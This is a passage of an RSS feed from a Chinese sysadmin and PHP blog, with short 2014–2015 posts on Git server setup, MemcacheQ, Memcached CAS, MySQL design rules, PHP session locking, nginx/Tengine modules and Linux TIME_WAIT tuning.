注:修改前先记得备份，以免数据被截了，优化因人而异，方法是一样的~~
优化前后 分析下SELECT * from wpasbfd_posts语句在Sending data的耗时就减少很多~~
最后说一句，如果优化完升级了wordpress需要再次优化哦，因为升级会把之前改的数据结构还原~~</description>
    </item>
    
    <item>
      <title>centos搭建Git服务器</title>
      <link>https://ifunbox.top/centos_git_configuration/</link>
      <pubDate>Sun, 06 Sep 2015 09:46:07 +0000</pubDate>
      
      <guid>https://ifunbox.top/centos_git_configuration/</guid>
      <description>GitHub就是一个免费托管开源代码的远程仓库。但是对于某些视源代码如生命的商业公司来说，既不想公开源代码，又舍不得给GitHub交保护费，那就只能自己搭建一台Git服务器作为私有仓库使用。
假设你已经有sudo权限的用户账号，下面，正式开始安装。
第一步，安装git：
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;yum install -y git&amp;amp;lt;/span&amp;gt;  第二步，创建一个git用户，用来运行git服务：
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;adduser git -d /home/git/ -s /usr/bin/git-shell&amp;amp;lt;/span&amp;gt;  第三步，创建证书登录：
收集所有需要登录的用户的公钥，就是他们自己的id_rsa.pub文件，把所有公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个。
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;[ssh-keygen -t rsa -C &amp;quot;name@baidu.com&amp;quot;]&amp;amp;lt;/span&amp;gt;  第四步，初始化Git仓库：
先选定一个目录作为Git仓库，假定是/home/git/sample.git，在/home/git目录下输入命令：
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;sudo git init --bare sample.git&amp;amp;lt;/span&amp;gt;  Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。然后，把owner改为git：Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。然后，把owner改为git：
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;sudo chown -R git:git sample.git&amp;amp;lt;/span&amp;gt;  第五步，禁用shell登录：
出于安全考虑，第二步创建的git用户不允许登录shell，这可以通过编辑/etc/passwd文件完成。找到类似下面的一行：
&amp;lt;span class=&#34;symbol&#34;git:&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;x:&amp;lt;/span&amp;lt;span class=&#34;number&#34;1001&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;:&amp;lt;/span&amp;lt;span class=&#34;number&#34;1001&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;:&amp;lt;/span,,,&amp;lt;span class=&#34;symbol&#34;:/home/git&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;:/bin/bash&amp;lt;/span 改成 &amp;lt;span class=&#34;symbol&#34;git:&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;x:&amp;lt;/span&amp;lt;span class=&#34;number&#34;1001&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;:&amp;lt;/span&amp;lt;span class=&#34;number&#34;1001&amp;lt;/span&amp;lt;span class=&#34;symbol&#34;:&amp;lt;/span,,,&amp;lt;span class=&#34;symbol&#34;:/home/git&amp;lt;/span&amp;lt;span class=&#34;</description>
    </item>
    
    <item>
      <title>MemcacheQ消息队列在Linux中编译安装自启动教程</title>
      <link>https://ifunbox.top/linux_memcacheq_configuration/</link>
      <pubDate>Sat, 05 Sep 2015 06:58:44 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_memcacheq_configuration/</guid>
      <description>队列（Queue）是一种常用的数据结构。在队列这种数据结构中，最先插入的元素将会最先被取出；反之最后插入的元素将会最后被取出，因此队列又称为“先进先出”（FIFO：First In First Out）的线性表。
加入元素的一端叫“队尾”，取出元素的一端叫“队头”。利用消息队列可以很好地异步处理数据的传送和存储，当遇到频繁且密集地向后端数据库中插入数据时，就可采用消息队列来异步处理这些数据写入。
MemcacheQ是一款基于Memcache协议的开源消息队列服务软件，由于其遵循了Memcache协议，因此开发成本很低，不需要学习额外的知识便可轻松掌握。
我在最近的一个项目中也应用了MemcacheQ，下面我将分享一下MemcacheQ在Linux中的编译和安装过程。
首先，MemcacheQ依赖于BerkeleyDB和Libevent，如果服务器中曾经安装过Memcached，那么Libevent应该已经存在了，否则就需要先下载安装Libevent。
下载链接如下：
  Libevent： https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz  Berkeley DB： http://download.oracle.com/berkeley-db/db-6.0.30.tar.gz  MemcacheQ： https://github.com/stvchu/memcacheq  安装Libevent ``` &amp;lt;span style=&#34;font-size: 12pt;&#34;tar zvxf libevent-2.0.21-stable.tar.gz cd libevent-2.0.21-stable ./configure --prefix=/usr/local/libevent make &amp;&amp; make install echo &#34;/usr/local/libevent/lib&#34; &amp;gt;&amp;gt; /etc/ld.so.conf ldconfig&amp;lt;/span ```  安装BerkeleyDB  BerkeleyDB简介：BerkeleyDB是一个开源的文件数据库，介于关系数据库与内存数据库之间，使用方式与内存数据库类似，它提供的是一系列直接访问数据库的函数，而不是像关系数据库那样需要网络通讯、SQL解析等步骤。  MemcacheQ依赖BerkleyDB用于队列数据的持久化存储，以免在MemcacheQ意外崩溃或中断时，队列数据不会丢失。 ``` &amp;lt;span style=&#34;font-size: 12pt;&#34;tar zxvf db-6.0.30.tar.gz cd db-6.0.30/build_unix ../dist/configure --prefix=/usr/local/berkeleydb make &amp;&amp; make install ln -s /usr/local/berkeleydb/lib/libdb-6.0.so /usr/lib/ echo &#34;/usr/local/berkeleydb/lib/&#34; &amp;gt;&amp;gt; /etc/ld.so.conf ldconfig&amp;lt;/span ```  安装MemcacheQ ``` &amp;lt;span style=&#34;</description>
    </item>
    
    <item>
      <title>Memcached的CAS (Check And Set) 协议</title>
      <link>https://ifunbox.top/memcached_cas/</link>
      <pubDate>Wed, 26 Aug 2015 10:35:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/memcached_cas/</guid>
      <description>最近无意中翻阅到大牛讲解微信红包实现的文章，文中提到CAS，这是啥的，能不能不用简称，查了半天终于找到了，下面总结下备忘~
1. 什么是CAS协议
很多中文的资料都不会告诉大家CAS的全称是什么，不过一定不要把CAS当作中国科学院（China Academy of Sciences）的缩写。Google.com一下，CAS是什么？CAS是Check And Set的缩写。
2. CAS协议原文
http://code.sixapart.com/svn/memcached/trunk/server/doc/protocol.txt
3. CAS的基本原理
基本原理非常简单，一言以蔽之，就是“版本号”。每个存储的数据对象，多有一个版本号。我们可以从下面的例子来理解：
如果不采用CAS，则有如下的情景：
第一步，A取出数据对象X；
第二步，B取出数据对象X；
第三步，B修改数据对象X，并将其放入缓存；
第四步，A修改数据对象X，并将其放入缓存。
我们可以发现，第四步中会产生数据写入冲突。
如果采用CAS协议，则是如下的情景。
第一步，A取出数据对象X，并获取到CAS-ID1；
第二步，B取出数据对象X，并获取到CAS-ID2；
第三步，B修改数据对象X，在写入缓存前，检查CAS-ID与缓存空间中该数据的CAS-ID是否一致。结果是“一致”，就将修改后的带有CAS-ID2的X写入到缓存。
第四步，A修改数据对象Y，在写入缓存前，检查CAS-ID与缓存空间中该数据的CAS-ID是否一致。结果是“不一致”，则拒绝写入，返回存储失败。
这样CAS协议就用了“版本号”的思想，解决了冲突问题。</description>
    </item>
    
    <item>
      <title>MYSQL数据库命名及设计规范</title>
      <link>https://ifunbox.top/mysql_design_standards/</link>
      <pubDate>Fri, 07 Aug 2015 05:54:14 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql_design_standards/</guid>
      <description>命名规范  库名、表名、字段名必须使用小写字母，并采用下划线分割 库名、表名、字段名禁止超过32个字符，须见名之意，建议使用名词不是动词 库名、表名、字段名禁止使用MySQL保留字 临时库、表名必须以tmp为前缀，并以日期为后缀 备份库、表必须以bak为前缀，并以日期为后缀  基础规范  使用INNODB存储引擎 表字符集使用UTF8 所有表都需要添加注释 单表数据量建议控制在5000W以内 禁止在数据库中使用VARBINARY、BLOB存储图片、文件等 禁止在线上做数据库压力测试 禁止从测试、开发环境直连数据库 存储精确浮点数必须使用DECIMAL替代FLOAT和DOUBLE 建议使用UNSIGNED存储非负数值。 建议使用INT UNSIGNED存储IPV4。（不过个人感觉可读性不是非常好） 整形定义中不添加长度，比如使用INT，而不是INT[4] 使用短数据类型，比如取值范围为0-80时，使用TINYINT UNSIGNED 不建议使用ENUM、SET类型，使用TINYINT来代替 尽可能不使用TEXT、BLOB类型 VARCHAR(N)，N表示的是字符数不是字节数，比如VARCHAR(255)，可以最大可存储255个汉字，需要根据实际的宽度来选择N。 VARCHAR(N)，N尽可能小，因为MySQL一个表中所有的VARCHAR字段最大长度是65535个字节，进行排序和创建临时表一类的内存操作时，会使用N的长度申请内存。 使用VARBINARY存储变长字符串。 存储年使用YEAR类型。 存储日期使用DATE类型。 存储时间（精确到秒）建议使用TIMESTAMP类型，因为TIMESTAMP使用4字节，DATETIME使用8个字节。 建议字段定义为NOT NULL  索引规范  非唯一索引必须按照“idx_字段名称_字段名称[_字段名]”进行命名 唯一索引必须按照“uniq_字段名称_字段名称[_字段名]”进行命名 索引中的字段数建议不超过5个 单张表的索引数量控制在5个以内 对字符串使用前缀索引，前缀索引长度不超过8个字符 建议优先考虑前缀索引，必要时可添加伪列并建立索引 合理创建联合索引（避免冗余），(a,b,c) 相当于 (a) 、(a,b) 、(a,b,c) 合理利用覆盖索引 表必须有主键 不使用更新频繁的列 尽量不选择字符串列 不使用UUID MD5 HASH 重要的SQL必须被索引,
UPDATE、DELETE语句的WHERE条件列,ORDER BY、GROUP BY、DISTINCT的字段,多表JOIN的字段 区分度最大的字段放在前面 核心SQL优先考虑覆盖索引 索引不是越多越好 不在低基数列上建立索引，例如性别 不在索引列进行数学运算和函数运算 尽量不使用外键 不使用%前导的查询，如like “%ab” 不使用负向查询，如not in/like(考虑用sphinx)  SQL设计  使用prepared statement，可以提供性能并且避免SQL注入 SQL语句中IN包含的值不超过500 UPDATE、DELETE语句不使用LIMIT WHERE条件中必须使用合适的类型，避免MySQL进行隐式类型转化 SELECT语句只获取需要的字段 SELECT、INSERT语句必须显式的指明字段名称，不使用SELECT *，不使用INSERT INTO table() INSERT语句使用batch提交（INSERT INTO table VALUES(),(),()……），values的个数不超过500 避免使用存储过程、触发器、UDF、events等 避免使用大表的JOIN 避免在数据库中进行数学运算 使用合理的SQL语句减少与数据库的交互次数 不使用ORDER BY RAND()，使用其他方法替换 建议使用合理的分页方式以提高分页的效率(只能点击上一页、下一页) 统计表中记录数时使用COUNT(*)，而不是COUNT(primary_key)和COUNT(1) 禁止在从库上执行后台管理和统计类型功能的QUERY。 使用EXPLAIN诊断，避免生成临时表 用union all而不是union 程序应有捕获SQL异常的处理机制 禁止单条SQL语句同时更新多个表  散表  每张表数据量建议控制在5000w以下 可以结合使用hash、range、lookup table进行散表 Hash散表，表名后缀使用16进制，比如user_ff 使用时间散表，表名后缀必须使用特定格式，比如按日散表user_20110209、按月散表user_201102。 采用合适的分库分表策略。例如千库十表、十库百表等  行为规范  批量导入、导出数据必须提前通知DBA协助观察 禁止在线上从库执行后台管理和统计类查询 禁止有super权限的应用程序账号存在 产品出现非数据库导致的故障时及时通知DBA协助排查 推广活动或上线新功能必须提前通知DBA进行流量评估 数据库数据丢失，及时联系DBA进行恢复 对单表的多次alter操作必须合并为一次操作 不在MySQL数据库中存放业务逻辑 重大项目的数据库方案选型和设计必须提前通知DBA参与 对特别重要的库表，提前与DBA沟通确定维护和备份优先级 不在业务高峰期批量更新、查询数据库 提交线上建表改表需求，必须详细注明所有相关SQL语句  FAQ</description>
    </item>
    
    <item>
      <title>解决手动运行脚本执行正常而放入crontab后不正常的方法</title>
      <link>https://ifunbox.top/linux_crontab_error/</link>
      <pubDate>Wed, 22 Apr 2015 04:07:28 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_crontab_error/</guid>
      <description>直接在crontab里面运行，有日志但是脚本有问题，没有写入文件
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt; 0 1 * * * /usr/local/php/bin/php /home/stock/index_cli.php&amp;amp;lt;/span&amp;gt;  也保证下写入文件夹的权限，还是不行
直接运行，就正常运行
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;/usr/local/php/bin/php /home/stock/index_cli.php&amp;amp;lt;/span&amp;gt;  
最后网络上找说是有可能是相对路径的问题，就改成
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;0 1 * * * sh /home/stock/stock.sh&amp;amp;lt;/span&amp;gt;  stock.sh代码如下
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;cd /home/stock/ /usr/local/php/bin/php /home/stock/index_cli.php&amp;amp;lt;/span&amp;gt;  先cd到执行脚本路径下就可以正常执行了
也找到一个帖子解决方法不过貌似不适用我这个情况，不过大家也可以看看
http://segmentfault.com/a/1190000000768446</description>
    </item>
    
    <item>
      <title>mysql数据字典生成工具php版</title>
      <link>https://ifunbox.top/php_mysql_data_dictionary_tools/</link>
      <pubDate>Wed, 01 Apr 2015 06:15:11 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_mysql_data_dictionary_tools/</guid>
      <description>工作交接，哭晕~
找了一个php写的数据字典生成工具，跟大家分享下
下载地址 http://vdisk.weibo.com/s/yThjZrryTIxQl
效果图</description>
    </item>
    
    <item>
      <title>结合MongoDB开发LBS应用-查看附近的人</title>
      <link>https://ifunbox.top/mongodb_lbs_nearby_people/</link>
      <pubDate>Thu, 26 Mar 2015 09:22:12 +0000</pubDate>
      
      <guid>https://ifunbox.top/mongodb_lbs_nearby_people/</guid>
      <description>最近负责的APP要上查看附件的人的功能
之前用coreseek做过类似附近的人的功能，觉得搭建索引整个下来太麻烦了
就开始寻找新的解决方案，查找到深入浅出Symfony2 &amp;#8211; 结合MongoDB开发LBS应用，里面介绍了4个可选方案，推荐使用MongoDB来实现
首先加一点往MongoDB数据

了解下geoNear的参数使用，如下的查询语句可以查询为某经纬度为中心附近的用户（从近到远），也计算去距离了。

thinkphp实现的代码，距离单位都是km
&amp;lt;span style=&amp;ldquo;font-size: 12pt;&amp;ldquo;&amp;gt;$where[&amp;lsquo;geoNear&amp;rsquo;] = &amp;lsquo;user_coordinate&amp;rsquo;; $where[&amp;lsquo;near&amp;rsquo;] = array($longitude,$latitude); $where[&amp;lsquo;spherical&amp;rsquo;] = true; $where[&amp;lsquo;maxDistance&amp;rsquo;] = $maxDistance/6371; $where[&amp;lsquo;distanceMultiplier&amp;rsquo;] = 6371; $where[&amp;lsquo;query&amp;rsquo;] = array(&amp;ldquo;status&amp;rdquo;=&amp;gt;1);
$res = $this-&amp;gt;_user_coordinate_mod-&amp;gt;command($where); if (!empty($res[&amp;lsquo;results&amp;rsquo;])) { foreach ($res[&amp;lsquo;results&amp;rsquo;] as $key =&amp;gt; $value) { $data[$key] = $value[&amp;lsquo;obj&amp;rsquo;]; $data[$key][&amp;lsquo;dis&amp;rsquo;] = $value[&amp;lsquo;dis&amp;rsquo;]; }
} return $data;&amp;lt;/span&amp;gt; ```
就这样搞定了</description>
    </item>
    
    <item>
      <title>避免SESSION锁阻塞请求</title>
      <link>https://ifunbox.top/avoid_session_lock/</link>
      <pubDate>Thu, 12 Feb 2015 06:38:36 +0000</pubDate>
      
      <guid>https://ifunbox.top/avoid_session_lock/</guid>
      <description>这篇文章是对我上一篇文章的深入研究php-fpm-slow.log慢日志频繁出现session_start()，也是对阻挡的效果的体会。
问题的开始是fpm-slow-log出现很多session_start()，单纯的认为是硬盘读写问题是错误的，只怪当时太年轻。
翻到了这两篇文章
http://konrness.com/php5/how-to-prevent-blocking-php-requests/
http://www.leaseweblabs.com/2014/08/session-locking-non-blocking-read-sessions-php/
介绍了什么是session lock，怎么工作，为什么需要，如何避免阻塞。
决定自己动手体验下。
准备两段测试代码。
test.html
&amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=1&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=2&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=3&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=4&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=5&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=6&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=7&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=8&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=9&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://ifunbox.top/demo/session_start_test/test.php?v=10&amp;quot;&amp;gt;  test.php
&amp;lt;?php session_start(); $_SESSION[&#39;latestRequestTime&#39;] = time(); session_write_close(); sleep(2); $twitterId = $_SESSION[&#39;latestRequestTime&#39;]; echo json_encode($twitterId); ?&amp;gt;  1.我们先在火狐上访问test.html，里面有10个php请求到test.php。
效果如下图，因为火狐默认6个并发连接，所以前6个请求是木有阻隔的，但是由于session lock的原因，每个请求时间都比上一个晚2S，必须等上一个请求释放session lock。第7个请求就被阻隔了2S，因为要等第一个请求被释放嘛，O(∩_∩)O~

2.然后去除test.php中session_write_close();前面的注释
再用火狐上访问test.html，效果如下图。发现前面6个请求，不需要等待上一个请求结束，已经并行了，是因为session_write_close()释放了session lock的原因。

3.我们下载火狐附加组件Tweak network修改并行连接数为10，

然后注释掉之前去除注释的代码访问test.html。效果如下。阻隔条消失，所以网络上有一些浏览器优化配置其实就是调大的并发连接数来加速网页js，php，图片的加载。

到这里对session lock阻塞就大致明白了。
回过头解决问题了，我回想了自己项目的应用场景好多ajax加载界面甚至有ajax定时刷新，难道这个是罪魁祸首！
于是乎就把涉及到的ajax接口不需要用session的就不session_start()，不需要写入session的就在session_start()后直接加入session_write_close()，需要写入session的，写入session后加入session_write_close()。

优化了下全部请求下来总时长快了1S，我tm惊呆了~</description>
    </item>
    
    <item>
      <title>php-fpm-slow.log慢日志频繁出现session_start()</title>
      <link>https://ifunbox.top/slow_log_session_start/</link>
      <pubDate>Wed, 11 Feb 2015 06:09:54 +0000</pubDate>
      
      <guid>https://ifunbox.top/slow_log_session_start/</guid>
      <description>最近项目php-fpm-slow.log慢日志中经常出现以下的记录

php自带函数session_start()
打开php.ini查看了下session.save_handler参数，默认配置的是file，本能反应猜测是否影响读写的问题，索性配置成memcache试试吧。配置改成
session.save_handler = memcache
session.save_path = &amp;#8220;tcp://127.0.0.1:11211&amp;#8221;
然后php-fpm reload下，网站正常运行。
查看下mc里面出现一大堆以sessionid为key的值

截止目前慢日志不在出现 session_start()了
阿里云的硬盘读写真的是那么水咩，之后再研究分析下~~
&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;
&amp;nbsp;
经过一段时间的分析观察，很不幸上面的方法不能根本解决请移步https://ifunbox.top/970.html
还有阿里云的硬盘读写还过得去</description>
    </item>
    
    <item>
      <title>tengine安装trim filter模块</title>
      <link>https://ifunbox.top/tengine_trim_filter/</link>
      <pubDate>Sat, 07 Feb 2015 13:41:19 +0000</pubDate>
      
      <guid>https://ifunbox.top/tengine_trim_filter/</guid>
      <description>最近闲来无事想用用淘宝tengine的trim filter模块
官方介绍配置链接http://tengine.taobao.org/document_cn/http_trim_filter_cn.html
但是没有安装的方法指南
这个模块貌似只能动态加载
官方动态加载指南http://tengine.taobao.org/document_cn/dso_cn.html
看了这些基本知识，开始尝试安装吧
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;./configure --with--http_trim_filter_module=shared make make dso_install&amp;amp;lt;/span&amp;gt;  nginx.conf中events上方加入
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;dso { load ngx_http_trim_filter_module.so; }&amp;amp;lt;/span&amp;gt;  网站配置内加入
&amp;amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;trim on; trim_jscss on;&amp;amp;lt;/span&amp;gt;  官方配置是trim_js trim_css 我配置这样会报错，估计很久没有更新文档咯~
至此安装成功，看下效果首页减少2K，嘿嘿~
还有一点：trim_jscss开启不一定适合全部网站哦，开启可能会影响js</description>
    </item>
    
    <item>
      <title>安装tcpcopy/intercept configure checking for pcap.h not found错误解决方法</title>
      <link>https://ifunbox.top/tcpcopy/intercept_configure_checking_for_pcap.h_not_found</link>
      <pubDate>Mon, 19 Jan 2015 14:53:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/tcpcopy/intercept_configure_checking_for_pcap.h_not_found</guid>
      <description>安装tcpcopy的时候很顺利
在安装intercept的时候
敲./configure
报错checking for pcap.h &amp;#8230; not found
网上貌似说的人不多
这里记录下
yum install libpcap-devel 即可解决</description>
    </item>
    
    <item>
      <title>thinkphp Mongo模型的使用问题</title>
      <link>https://ifunbox.top/thinkphp_mongodb_model/</link>
      <pubDate>Wed, 07 Jan 2015 08:51:42 +0000</pubDate>
      
      <guid>https://ifunbox.top/thinkphp_mongodb_model/</guid>
      <description>先上官方使用Mongo模型开发文档
感觉写的不是很全，也许我不熟悉tp吧 😳
目前这个项目默认是连接MYSQL数据库
最近开发消息中心，涉及到在程序期间要连接Mongo数据库
最开始用了下面这个方式创建模式
define(&amp;lsquo;MONGO_DB_HOST&amp;rsquo;, &amp;lsquo;192.168.1.172&amp;rsquo;); define(&amp;lsquo;MONGO_DB_PORT&amp;rsquo;, 30000); define(&amp;lsquo;MONGO_DB_NAME&amp;rsquo;, &amp;lsquo;funbox_test&amp;rsquo;); define(&amp;lsquo;MONGO_DSN&amp;rsquo;, &amp;lsquo;mongo://&amp;lsquo;.MONGO_DB_HOST.&amp;rsquo;:&amp;lsquo;.MONGO_DB_PORT.&amp;lsquo;/&amp;rsquo;.MONGO_DB_NAME);
M(&amp;lsquo;MongoModel:msg_log&amp;rsquo;,&amp;ldquo;,MONGO_DSN);
 &amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;死活连不上funbox_test这个库，连上的是funbox，十分费解&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;最好耐下性子看了源码&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;MongoModel类中有$this-&amp;gt;dbName这个参数没有任何赋值的地方，如果没有赋值，就会显示默认配置MYSQL的库名，MYSQL库我配置的是funbox，原来如此。&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: 12pt;&amp;quot;&amp;gt;继续看父类Model，在Model类中的__construct发现了线索，第79行&amp;lt;/span&amp;gt; &amp;lt;pre&amp;gt;&amp;lt;code class=&amp;quot;php&amp;quot;&amp;gt; $this-&amp;amp;gt;_initialize(); // 获取模型名称 if(!empty($name)) { if(strpos($name,&#39;.&#39;)) { // 支持 数据库名.模型名的 定义 &amp;amp;lt;strong&amp;gt;list($this-&amp;amp;gt;dbName,$this-&amp;amp;gt;name) = explode(&#39;.&#39;,$name);&amp;amp;lt;/strong&amp;gt; }else{ $this-&amp;amp;gt;name = $name; } }elseif(empty($this-&amp;amp;gt;name)){ $this-&amp;amp;gt;name = $this-&amp;amp;gt;getModelName(); }  可以通过下面的写法来解决选择数据库的问题
M(&amp;#8216;MongoModel:&amp;#8217;.MONGO_DB_NAME.&amp;#8217;.msg_log&amp;#8217;,&amp;#8221;,MONGO_DSN);
研究了一个下午，希望能为大家排排雷。</description>
    </item>
    
    <item>
      <title>TIME_WAIT过多导致负载爆表优化方法</title>
      <link>https://ifunbox.top/optimize_linux_time_wait/</link>
      <pubDate>Sun, 04 Jan 2015 11:34:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/optimize_linux_time_wait/</guid>
      <description>&lt;div id=&#34;cnblogs_post_body&#34;&gt;
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;最近参与的项目每日大概有300w的请求量，8核的服务器负载竟然最高可以跑到20，给跪了&lt;/span&gt;
  &lt;/p&gt;
  
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;查看TCP状态：netstat -n | awk &amp;#8216;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&amp;#8217;&lt;/span&gt;&lt;br /&gt; &lt;span style=&#34;font-size: 12pt;&#34;&gt; TIME_WAIT 有5000，ESTABLISHED有500左右&lt;/span&gt;
  &lt;/p&gt;
  
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;摸不着头脑，随意百度了下TIME_WAIT过多&lt;/span&gt;&lt;br /&gt; &lt;span style=&#34;font-size: 12pt;&#34;&gt; 发现TIME_WAIT状态的socket一般需要等到2msl时间后，socket才会被回收，TIME_WAIT过多会影响服务器性能&lt;/span&gt;
  &lt;/p&gt;
  
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;解决TIME_WAIT过多的方法&lt;br /&gt; 修改(添加)系统内核参数:/etc/sysctl.conf&lt;/span&gt;
  &lt;/p&gt;
  
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;#改系統默认的TIMEOUT时间&lt;/span&gt;&lt;br /&gt; &lt;span style=&#34;font-size: 12pt;&#34;&gt; net.ipv4.tcp_fin_timeout=30&lt;br /&gt; #启重用,允许将TIME-WAIT sockets重新用于新的TCP连接 默认为0表示关闭&lt;/span&gt;&lt;br /&gt; &lt;span style=&#34;font-size: 12pt;&#34;&gt; net.ipv4.tcp_tw_reuse=1&lt;br /&gt; #开启TCP连接中TIME-WAIT sockets的快速回收 默认为0 表示关闭&lt;/span&gt;&lt;br /&gt; &lt;span style=&#34;font-size: 12pt;&#34;&gt; net.ipv4.tcp_tw_recycle=1&lt;/span&gt;
  &lt;/p&gt;
  
  &lt;p&gt;
    &lt;span style=&#34;font-size: 12pt;&#34;&gt;使新增参数生效：sysctl -p&lt;/span&gt;
  &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>PHP基于PHP QR Code生成带不失真logo二维码</title>
      <link>https://ifunbox.top/php_generate_qrcode_logo/</link>
      <pubDate>Thu, 11 Dec 2014 08:16:23 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_generate_qrcode_logo/</guid>
      <description>最近项目要搞一个生成带logo二维码的接口
google了下有一个超级强大的二维码库PHP QR Code
这里有供快速上手的例子，个人认为不太容易懂http://phpqrcode.sourceforge.net/examples/index.php
找了半天貌似官方库，没有一个二维码中间加logo的功能
给跪了
网上再次搜索了下大部分都是这类代码，用了一下logo都失真了。
$text = &#39;http://www.funboxpower.com&#39;; $logo = &amp;quot;i/logo.png&amp;quot;; //加的logo可以是本地路径也可以是网址 $errorCorrectionLevel = 3;//容错级别 $matrixPointSize = 9;//生成图片大小 生成大概400*400的二维码 //生成二维码图片 $QR = &amp;quot;i/qrcode.png&amp;quot;; //临时保存的文件名i文件夹里面 QRcode::png($text, $QR, $errorCorrectionLevel, $matrixPointSize, 2); //加logo if ($logo !== FALSE) { $QR = imagecreatefromstring(file_get_contents($QR)); $logo = imagecreatefromstring(file_get_contents($logo)); $QR_width = imagesx($QR); $QR_height = imagesy($QR); $logo_width = imagesx($logo); $logo_height = imagesy($logo); $logo_qr_width = $QR_width / 4; $scale = $logo_width / $logo_qr_width; $logo_qr_height = $logo_height / $scale; $from_width = ($QR_width - $logo_qr_width) / 2; imagecopyresampled($QR, $logo, $from_width, $from_width, 0, 0, $logo_qr_width, $logo_qr_height, $logo_width, $logo_height); } header(&amp;quot;Content-type: image/png&amp;quot;); imagepng($QR); imagedestroy($QR);  查了涉及到的相关php自带函数，发现是imagecopyresampled的原因，图片合并后的质量会被$OR影响</description>
    </item>
    
    <item>
      <title>nginx1.6下安装nginx_concat_module报400错误</title>
      <link>https://ifunbox.top/nginx_concat_module_400/</link>
      <pubDate>Mon, 01 Dec 2014 03:48:50 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx_concat_module_400/</guid>
      <description>第一次安装都很顺利，第二次安装就出现访问合并链接出现400错误。
瞬间就跪了，果断google之，居然有前人也碰到这样的问题，有救了。
由于Nginx在新版本中，使用了标准的 MIME-Type：application/javascript。而在nginx_concat_module模块目前版本的代码中，写的是 application/x-javascript 的类型。
也就是模块认不到js文件了。。。
[root@tools-ops01-jz src]# grep javascript nginx_concat_module/ngx_http_concat_module.c ngx_string(&amp;quot;application/x-javascript&amp;quot;),  因此，我们最好在向nginx添加该模块之前，修改nginx_concat_module的源代码文件ngx_http_concat_module.c，将application/x-javascript更改为application/javascript，然后再编译安装即可！</description>
    </item>
    
    <item>
      <title>nginx1.6添加第三方模块nginx_concat_module合并http请求</title>
